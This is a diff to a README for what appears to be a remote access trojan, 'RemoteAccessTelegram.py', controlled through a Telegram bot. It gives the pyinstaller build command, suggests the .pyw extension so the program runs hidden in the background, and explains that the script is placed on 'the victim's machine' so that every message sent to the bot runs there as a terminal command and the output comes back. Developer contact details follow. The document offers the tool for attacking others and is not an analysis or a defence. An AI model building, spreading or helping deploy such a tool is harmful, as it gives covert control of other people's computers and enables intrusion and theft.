@@ -46,7 +46,19 @@ After all the actions with the file, it must be compiled into an executable file
 pyinstaller -F RemoteAccessTelegram.py
 ```
 You can rename the file and change the extension from `.py` on `.pyw` to make the file run in the background process.
+
+## The principle of operation
+This script must be run on the victim's machine, your telegram user id must be specified in the script, but this is not necessary and the bot token after running the script, the bot will work in it, all messages that you send will be executed on the victim's machine as terminal commands.
  
+```
+Script <-- Telegram bot
+
+  Executing a terminal command...
+
+Script --> Telegram bot
+```
+Even if some error occurs, it will be returned to the bot by the script.
+
 ## Developer 
 Email    : wwwkali00312@gmail.com<br>
 Telegram : https://t.me/metrossoftware
